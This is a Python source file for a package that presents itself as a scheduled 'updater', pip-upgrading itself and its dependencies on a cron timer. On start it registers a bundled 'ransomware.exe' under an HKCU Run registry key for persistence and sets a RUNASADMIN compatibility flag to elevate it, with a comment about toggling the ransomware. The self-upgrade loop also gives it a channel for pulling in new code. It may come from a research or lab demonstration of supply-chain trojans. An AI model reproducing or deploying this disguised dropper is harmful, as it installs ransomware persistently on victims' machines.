"""
"""

import configparser
import logging
import sys
from datetime import datetime
from importlib.resources import as_file, files
from json import loads
from pathlib import Path
from subprocess import PIPE, Popen
from time import sleep

from croniter import croniter
from mwutils.persistence.registry_run_keys_startup_folder import (
    add_registry_entry, persist_via_HKCU_key, persist_via_HKLM_key)

logger = logging.getLogger(__name__)


def autostart(registry_key: str, package: str, resource: str) -> None:
    # Get the path of the .exe and add it to the registry.
    with as_file(files(package).joinpath(resource)) as context:
        persist_via_HKCU_key(
            registry_key, f"cmd /c start {Path(context)}"
        )  # ToDo f"cmd /c start /min {Path(context)}"
        # reg_privileges = r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
        reg_privileges = r"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
        add_registry_entry(reg_privileges, Path(context), "RUNASADMIN")


def get_dependencies(package_name: str):
    """Lists the packages that depend on the given package"""
    with Popen(
        ["pipdeptree", "--json-tree", "-r", "--packages", package_name],
        stdout=PIPE,
        stderr=PIPE,
        shell=True,
    ) as proc:
        dependency_list = []
        out, err = proc.communicate()
        out, err = out.decode("utf-8"), err.decode("utf-8")
        out = loads(out)
        if out != []:
            out = out[0]["dependencies"]
            for package in out:
                dependency_list.append(package["package_name"])
            logging.debug("Get dependencies of %s: %s", package_name, dependency_list)
            return dependency_list

        logger.debug("Get dependencies of %s: none", package_name)
        return []


def update_package(package_name: str) -> None:
    """Update the given package.

    Args:
        package_name (str): Package name.
    """
    with Popen(
        ["pip", "install", "--upgrade", package_name],
        stdout=PIPE,
        stderr=PIPE,
        shell=True,
    ) as proc:
        out, err = proc.communicate()
        out, err = out.decode("utf-8"), err.decode("utf-8")
        logger.debug("update %s: %s | %s", package_name, out, err)


def update_packages(packages: list) -> None:
    """Update a list of packages.

    Args:
        packages (list): Packages to update.
    """
    for package in packages:
        update_package(package)


def load_conf(conf_file: str = None) -> str:
    """If you have trouble define a cron schedule expression use: https://crontab.guru/

    Return a cron schedule expression.
    """
    try:
        cfg = configparser.ConfigParser()
        cfg.read(conf_file)
    except:
        package_conf_toml = files("updater").joinpath("conf.toml").open("r").read()
        cfg.read_string(package_conf_toml)

    crontab = cfg.get("Config", "cron")
    logger.debug("Using cron string: %s", crontab)

    return crontab


def run():
    autostart(
        "Updater", "updater", "ransomware.exe"
    )  # ToDo: (un)comment for ransomware

    FORMAT = "[%(asctime)s] [%(funcName)-30s] [%(levelname)-8s] [%(message)s]"
    logging.basicConfig(stream=sys.stdout, encoding="utf-8", format=FORMAT, level=0)

    cron = load_conf()

    logging.debug("starting updater...")

    while True:
        current_time = datetime.now()
        cronjob_iter = croniter(cron, current_time)
        next_run_time = cronjob_iter.get_next(datetime)
        delta = (next_run_time - current_time).total_seconds()
        logging.info(
            "Current time: %s next run at %s -> sleeping for %s sec",
            current_time.isoformat(sep=" ", timespec="seconds"),
            next_run_time,
            delta,
        )
        sleep(delta)

        PACKAGE = "updater"
        dependencies = get_dependencies(PACKAGE)
        logging.debug("Found dependencies: %s", dependencies)
        update_package(PACKAGE)
        update_packages(dependencies)


if __name__ == "__main__":
    run()
